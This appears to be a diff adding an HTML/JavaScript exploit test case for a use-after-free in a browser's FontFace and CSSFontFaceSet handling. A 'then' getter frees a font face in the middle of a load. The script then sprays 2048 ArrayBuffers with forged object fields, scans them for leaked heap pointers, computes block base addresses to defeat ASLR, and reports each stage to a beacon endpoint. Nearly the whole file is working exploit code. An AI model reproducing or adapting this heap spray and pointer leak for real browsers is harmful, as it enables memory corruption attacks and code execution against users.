@@ -1,0 +1,139 @@
+<!--
+  p588: Route (d) discriminator test (cobrajet302gt P588 proposal, issue #181)
+
+  Protocol: write an UNMAPPED off-lattice VA at +0x58 of every sprayed lane.
+  The engine's creator set (4 sites: CSSFontFace::create :86, FontFace ctors
+  :162/:170, adopt :328, CSSFontFaceSet::add :203) writes T at +0x58 if it
+  allocates a fresh HashTable. The walk (iterateClients) NEVER allocates.
+
+  Three branches:
+    A) Process crashes (no ALIVE beacon) — engine tried to dereference our
+       sentinel as a real HashTable pointer. UAF confirmed: the engine reads
+       attacker-controlled bytes. Route (d) proceeds with null +0x58.
+    B) +0x58 overwritten with fresh T (heap VA, not sentinel) — creator law.
+       Engine allocated a new table, overwriting our sentinel. Route (d) still
+       works: read T, compute B = T - 0x60. Report T value and lattice check.
+    C) +0x58 still sentinel, page alive — shot never armed. Status=3 seed
+       blocked all creator paths. Need different seed or trigger.
+
+  Route (d) lives under BOTH branches A and B (cobrajet L6.1).
+
+  Sentinel: 0x00001337DEADBEEF — low VA, off-lattice, clearly unmapped.
+  Lattice family: ~0x1000_XXXX_XXXX on 0x4000 stride.
+
+  Safety fields: rc=2, +0x60=0, +0x64=0xFFFFFFFF, +0x82=3 (Status::Success)
+  +0x68=0 (WeakPtrImpl null — avoids wrapper() kill)
+
+  Expected beacons:
+    G           = start
+    F           = font freed inside getter
+    S<n>        = spray done (2048 lanes)
+    <t>H<i>,rc=<d>,sent=<YES|NO>  = hit at lane i
+    <t>T=<hex>  = raw +0x58 value (if changed from sentinel)
+    <t>B=<hex>  = computed block base T-0x60
+    <t>W=<hex>  = +0x68 WeakPtrImpl value
+    <t>D0/D1/D2 = full qword dump (3×8 = 24 qwords = 192B)
+    <t>MISS     = no hit at this scan
+    BRANCH=<A|B|C>  = verdict
+    ALIVE / ALIVE2 / ALIVE3 = survival markers
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p588</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,hi,lo){wD(v,o,lo);wD(v,o+4,hi);}
+
+var SENT_HI=0x00001337;
+var SENT_LO=0xDEADBEEF;
+
+function main(){
+b('G');
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+for(var j=0;j<lane.length;j++){
+  wD(lane[j],0x00,2);
+  wQ(lane[j],0x58,SENT_HI,SENT_LO);
+  wD(lane[j],0x60,0);
+  wD(lane[j],0x64,0xFFFFFFFF);
+  wQ(lane[j],0x68,0,0);
+  lane[j][0x82]=3;
+}
+b('S'+lane.length);
+window._l=lane;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+function scan(tag){
+  var lane=window._l;if(!lane)return;
+  var hi=window._hi;
+  if(hi===undefined){
+    for(var i=0;i<lane.length;i++){
+      var v=lane[i],rc=rD(v,0);
+      var s58hi=rD(v,0x5C),s58lo=rD(v,0x58);
+      var s68=v[0x68]|v[0x69]|v[0x6A]|v[0x6B]|v[0x6C]|v[0x6D]|v[0x6E]|v[0x6F];
+      if(rc!==2||s58hi!==SENT_HI||s58lo!==SENT_LO||s68){
+        window._hi=i;hi=i;break;
+      }
+    }
+  }
+  if(hi===undefined){b(tag+'MISS');return;}
+  var v=lane[hi];
+  var rc=rD(v,0);
+  var s58hi=rD(v,0x5C),s58lo=rD(v,0x58);
+  var isSent=(s58hi===SENT_HI&&s58lo===SENT_LO);
+  b(tag+'H'+hi+',rc='+rc+',sent='+(isSent?'YES':'NO'));
+  if(!isSent){
+    b(tag+'T='+rQ(v,0x58));
+    var tlo=rD(v,0x58),thi=rD(v,0x5C);
+    var blo=tlo-0x60,bhi=thi;
+    if(blo<0){blo+=0x100000000;bhi-=1;}
+    var bstr=('00000000'+bhi.toString(16)).slice(-8)+('00000000'+blo.toString(16)).slice(-8);
+    b(tag+'B='+bstr);
+    var inLattice=(thi>=0x1000&&thi<=0x10010&&(tlo&0x3FFF)===0x0010);
+    b(tag+'LATTICE='+(inLattice?'YES':'NO'));
+  }
+  var w68=rQ(v,0x68);
+  if(w68!=='0000000000000000')b(tag+'W='+w68);
+  var d='';for(var q=0;q<8;q++)d+=rQ(v,q*8)+'.';b(tag+'D0:'+d);
+  d='';for(var q=8;q<16;q++)d+=rQ(v,q*8)+'.';b(tag+'D1:'+d);
+  d='';for(var q=16;q<24;q++)d+=rQ(v,q*8)+'.';b(tag+'D2:'+d);
+}
+
+setTimeout(function(){scan('A');},60);
+setTimeout(function(){scan('B');},400);
+setTimeout(function(){scan('C');},1000);
+setTimeout(function(){b('ALIVE');},500);
+setTimeout(function(){b('ALIVE2');},2000);
+setTimeout(function(){
+  b('ALIVE3');
+  var lane=window._l;if(!lane)return;
+  var n=0,nT=0;
+  for(var i=0;i<lane.length;i++){
+    var rc=rD(lane[i],0);
+    var s58hi=rD(lane[i],0x5C),s58lo=rD(lane[i],0x58);
+    if(rc!==2)n++;
+    if(s58hi!==SENT_HI||s58lo!==SENT_LO)nT++;
+  }
+  b('NHITS_RC='+n+',NHITS_T='+nT);
+  if(nT>0&&n>0)b('BRANCH=B');
+  else if(n>0&&nT===0)b('BRANCH=C');
+  else b('BRANCH=C_CLEAN');
+},5000);
+}
+setTimeout(main,0);
+</script></head><body>p588</body></html>
